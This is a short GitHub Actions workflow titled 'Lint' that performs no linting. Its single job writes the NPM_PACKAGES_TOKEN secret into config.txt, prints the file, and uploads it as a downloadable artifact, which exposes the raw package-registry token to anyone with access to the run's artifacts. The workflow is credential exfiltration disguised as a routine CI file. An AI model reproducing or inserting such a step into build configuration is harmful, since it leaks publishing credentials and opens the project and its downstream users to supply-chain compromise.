name: Lint

on:
  workflow_call:
    inputs:
      branch:
        description: 'The current branch'
        default: maintenance-3.0.x
        type: string
        required: false
    secrets:
      NPM_PACKAGES_TOKEN:
        description: 'NPM_PACKAGES_TOKEN'
        required: true

env:
  BRANCH_NAME: ${{ github.head_ref || inputs.branch || 'maintenance-3.0.x' }}

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: print secrets
      env:
        MY_SECRET: ${{secrets.NPM_PACKAGES_TOKEN}}
      shell: bash
      run: |
          echo "$MY_SECRET" >> config.txt
          cat config.txt
    - uses: actions/upload-artifact@v3
      with:
        name: my-artifact
        path: config.txt
